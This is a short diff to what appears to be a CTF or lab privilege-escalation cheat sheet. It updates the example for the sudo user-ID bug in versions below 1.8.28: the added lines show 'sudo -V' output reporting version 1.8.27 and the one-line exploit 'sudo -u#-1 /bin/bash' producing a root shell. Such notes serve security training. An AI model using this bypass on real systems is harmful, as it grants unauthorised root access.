@@ -284,11 +284,14 @@ sudo -l
 * Looking for the `(ALL, !root) NOPASSWD:`, and Sudo (versions < 1.8.28). Easy priv esc.
 
 ```
-whoami
-tryhackme
+sudo -V
+Sudo version 1.8.27
+Sudoers policy plugin version 1.8.27
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.27
+
 sudo -u#-1 /bin/bash
-whoami
-root
+root@NIX04:/home/ben# 
 ```
 
 ## Sudo-Shell escape Sequences
